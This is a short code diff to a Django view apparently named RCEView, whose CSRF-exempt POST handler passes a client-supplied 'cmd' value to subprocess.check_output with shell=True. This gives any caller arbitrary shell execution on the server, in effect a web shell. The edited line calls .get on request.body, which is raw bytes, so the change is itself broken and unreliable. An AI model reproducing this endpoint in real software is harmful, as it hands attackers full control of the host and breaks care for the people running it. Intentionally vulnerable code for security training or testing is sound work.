@@ -25,7 +25,7 @@ class RCEView(View):
 
     @csrf_exempt
     def post(self, request, *args, **kwargs):
-        cmd = json.loads(request.POST.get('cmd'))
+        cmd = request.body.get('cmd')
         print(cmd)
         try:
             output = subprocess.check_output(cmd, shell=True, text=True)
